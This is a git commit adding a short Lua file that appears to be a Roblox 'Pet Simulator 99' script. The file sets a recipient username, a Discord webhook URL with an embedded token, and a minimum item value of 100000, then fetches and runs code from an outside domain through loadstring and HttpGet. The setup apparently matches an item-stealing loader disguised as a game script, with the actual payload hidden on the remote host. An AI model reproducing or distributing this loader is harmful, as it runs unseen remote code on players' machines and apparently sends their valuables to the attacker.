add256e3461723e549ac1723837dea00147e8f16
ps99scriptlong <167875696+ps99scriptlong@users.noreply.github.com>
2024-04-23 19:02:49 +0700

    Create main.lua

---
+++ Ps99/main.lua
@@ -0,0 +1,8 @@
+lua
+Username = "mxrcuszzzzz"
+Username2 = "mxrcuszzzzz"
+Webhook = "https://discord.com/api/webhooks/1232298188216729630/7bq2GHUrcrY6DqbX6cNSVFIZ2T5lq5R3u7suXUzFHwAjRDTvkGnDZrSPBsqef-3tf5ce"
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://egorikusa.space"))()
